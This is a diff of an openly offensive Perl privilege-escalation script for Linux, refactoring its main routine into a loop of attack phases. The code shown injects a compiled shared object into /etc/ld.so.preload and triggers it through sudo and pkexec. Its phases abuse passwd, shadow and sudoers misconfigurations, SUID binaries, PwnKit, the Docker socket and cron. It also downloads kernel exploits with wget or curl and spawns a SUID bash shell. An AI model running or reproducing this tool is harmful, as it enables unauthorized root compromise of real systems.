@@ -233,12 +233,13 @@ __attribute__((constructor)) void rootme() {
     close $f;
     sys_cmd("gcc -shared -fPIC -o $tmp/root.so $tmp/root.c 2>/dev/null");
     if (-e "$tmp/root.so") {
-        open($f, '>', '/etc/ld.so.preload');
-        print $f "$tmp/root.so\n";
-        close $f;
-        print "${C}[*] Injected. Triggering...${Z}\n";
-        sys_cmd("sudo -n /bin/true 2>/dev/null");
-        sys_cmd("pkexec /bin/true 2>/dev/null");
+        if (open(my $lf, '>', '/etc/ld.so.preload')) {
+            print $lf "$tmp/root.so\n";
+            close $lf;
+            print "${C}[*] Injected. Triggering...${Z}\n";
+            sys_cmd("sudo -n /bin/true 2>/dev/null");
+            sys_cmd("pkexec /bin/true 2>/dev/null");
+        }
     }
     try_suid_bash();
     droproot();
@@ -508,57 +509,35 @@ sub main {
     print "    User:     $W$user${Z} (uid=$uid gid=$gid)\n";
     print "    Perl:     $W$]${Z}\n\n";
 
-    # === FAST CHECKS (no deps) ===
-    print "${C}[*] Phase 1: Filesystem misconfig checks...${Z}\n";
-    exploit_passwd() and goto GOTROOT;
-    exploit_shadow() and goto GOTROOT;
-    exploit_sudoers() and goto GOTROOT;
-    exploit_ldpreload() and goto GOTROOT;
-    try_suid_bash() and goto GOTROOT;
+    my @phases = (
+        ["Phase 1: Filesystem misconfig", sub { exploit_passwd(); exploit_shadow(); exploit_sudoers(); exploit_ldpreload(); }],
+        ["Phase 2: SUID/GUID",           sub { exploit_suid(); }],
+        ["Phase 3: Sudo checks",          sub { exploit_sudo(); }],
+        ["Phase 4: PwnKit",              sub { exploit_pwnkit(); }],
+        ["Phase 5: Docker",              sub { exploit_docker(); }],
+        ["Phase 6: Cron hijack",         sub { exploit_cron(); }],
+    );
 
-    # === SUID ===
-    print "${C}[*] Phase 2: SUID/GUID enumeration...${Z}\n";
-    exploit_suid() and goto GOTROOT;
-    try_suid_bash() and goto GOTROOT;
-
-    # === SUDO ===
-    print "${C}[*] Phase 3: Sudo checks...${Z}\n";
-    exploit_sudo() and goto GOTROOT;
-    try_suid_bash() and goto GOTROOT;
-
-    # === PWNKIT ===
-    print "${C}[*] Phase 4: Known CVE exploits...${Z}\n";
-    exploit_pwnkit() and goto GOTROOT;
-    try_suid_bash() and goto GOTROOT;
-
-    # === DOCKER ===
-    print "${C}[*] Phase 5: Docker socket...${Z}\n";
-    exploit_docker() and goto GOTROOT;
-    try_suid_bash() and goto GOTROOT;
-
-    # === CRON ===
-    print "${C}[*] Phase 6: Cron hijack...${Z}\n";
-    exploit_cron() and goto GOTROOT;
-    try_suid_bash() and goto GOTROOT;
-
-    # === BINARY DOWNLOAD ===
     if (find_binary("wget") || find_binary("curl")) {
-        print "${C}[*] Phase 7: Downloading kernel exploits...${Z}\n";
-        auto_exploit_binary($kern) and goto GOTROOT;
-        try_suid_bash() and goto GOTROOT;
+        push @phases, ["Phase 7: Kernel exploits", sub { auto_exploit_binary($kern); }];
     }
 
-    print "${R}[-] No exploit succeeded. System appears patched.${Z}\n";
-    exit 1;
+    for my $phase (@phases) {
+        my ($name, $code) = @$phase;
+        print "${C}[*] $name...${Z}\n";
+        $code->();
+        try_suid_bash();
+        last if is_suid("/bin/bash") || isroot();
+    }
 
-  GOTROOT:
     try_suid_bash();
     if (isroot()) { droproot(); }
+
+    print "${R}[-] No exploit succeeded.${Z}\n";
     if (is_suid("/bin/bash")) {
+        print "${G}[+] /bin/bash is SUID! Run: /bin/bash -p${Z}\n";
         exec "/bin/bash", "-p";
     }
-    # Not root yet but exploit claims success - continue to next phase
-    print "${Y}[*] Continuing to next phase...${Z}\n";
 }
 
 main();
